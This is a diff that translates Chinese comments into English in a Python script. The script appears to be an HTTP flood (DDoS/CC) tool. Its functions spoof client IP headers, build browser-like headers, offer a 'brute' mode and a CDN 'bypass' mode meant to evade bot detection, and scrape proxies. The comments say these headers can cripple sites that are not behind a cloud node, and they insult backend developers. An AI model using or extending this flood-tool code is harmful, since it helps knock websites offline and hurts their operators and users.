@@ -190,18 +190,18 @@ def fakeIP(): #FakeIP — specifically targeting those moronic backend engineers
     ip = ""
     for _ in range(4):
         ip += f".{random.randint(1,254)}"
-        # 別懷疑 就是會有低能白癡後端 覺得後台看到的IP會是真的 
-        # 這邊觀念宣導, 資料庫抓到的ip 不管從哪個標頭抓的 全部都是可以偽造的
-        # X-forwarded-For, Client-IP, Via 等等 數不清的標頭 IP全部都可以偽造
-        # 任何傳到後端的資料都是可以經過偽造的 切記 !
-        # 只有TCP連線那個IP 才是真的流量來源 (如果是cc就會是代理的IP, botnet就會是bot的ip)
+        # Make no mistake: there really are moronic backend developers who think the IP address seen in the admin panel is the actual one. 
+        # Here’s a quick reality check: any IP address retrieved by the database—regardless of which header it comes from—can be completely faked.
+        # IP addresses in headers like X-Forwarded-For, Client-IP, Via, etc., can all be spoofed. 
+        # Remember: any data sent to the backend can be forged! 
+        # Only the IP address associated with the TCP connection represents the true source of the traffic (in the case of a CC attack, it would be the proxy's IP; for a botnet, it would be the bot's IP).
     return ip[1:] # 123.123.123.123
 
 
-def headerHandle(): #封包標頭處理
+def headerHandle(): #Packet Header Processing
 
-    # Http 一般標頭 包含常見的connection跟accept等 
-    # 如果網站不在任何雲端節點上 那這些標頭就可以實現癱瘓
+    # Standard HTTP headers, including common ones like 'Connection' and 'Accept'.
+    # If the website is not hosted on a cloud node, these headers can be used to cripple it.
     conn = f"Connection: Keep-Alive\r\n"
     accept = f"Accept: */*\r\nAccept-Encoding: gzip, deflate, br, zstd\r\nAccept-Language: zh-TW,zh;q=0.5\r\n"
     referer = f"Referer: {GetReferer()}\r\n"
@@ -217,8 +217,8 @@ def headerHandle(): #封包標頭處理
         origin += f"http://{host}\r\n"
     uir = f"Upgrade-Insecure-Requests: 1\r\n"
 
-    # Http 安全性標頭, 大部分主流的瀏覽器都支援了, 是判斷為正常流量 或是機器人的標準之一
-    # 新的站點大部分都是預設啟用sec的, 也就是沒有sec的都會被識別為惡意流量
+    # HTTP security headers are supported by most mainstream browsers and serve as one of the criteria for distinguishing legitimate traffic from bot traffic. 
+    # Most new sites have security features enabled by default; consequently, traffic lacking these headers is often flagged as malicious.
     sec = f"Sec-Ch-Ua: \"Chromium\";v=\"136\", \"Brave\";v=\"136\", \"Not.A/Brand\";v=\"99\"\r\n"
     sec += f"Sec-Ch-Ua-arch: \"x86\"\r\n"
     sec += f"Sec-Ch-Ua-bitness: \"64\"\r\n"
@@ -235,14 +235,14 @@ def headerHandle(): #封包標頭處理
     sec += f"Sec-Gpc: 1\r\n"
 
     header = conn + accept + referer + useragent + x_for + fake + cache + pri + origin + uir
-    if brute: #如果啟用brute 就最大程度減少標頭 只留關鍵標頭
+    if brute: # If brute-force mode is enabled, minimize headers to include only the essential ones.
         header = conn + accept + referer + useragent + uir
-    if cdn == 'bypass': #如果是bypass模式 那就必須加入sec
+    if cdn == 'bypass': #If it's bypass mode, then sec must be added.
         header +=sec
-    return header #回傳處理好的標頭
+    return header #Return the processed header
 
 
-def ProxyScraper(): # 抓取proxy的 , 用了無數次 可以肯定的說 50~70k的列表 延遲低於1秒 能用的都不會超過400個
+def ProxyScraper(): # 抓取proxy的 , # Regarding proxy scraping—having done this countless times, I can say with certainty that out of a list of 50,000 to 70,000 proxies with latencies under one second, no more than 400 are actually usable.
     global download_proxy
     print("Auto Proxy Scraper Code By GogoZin")
     time.sleep(2)
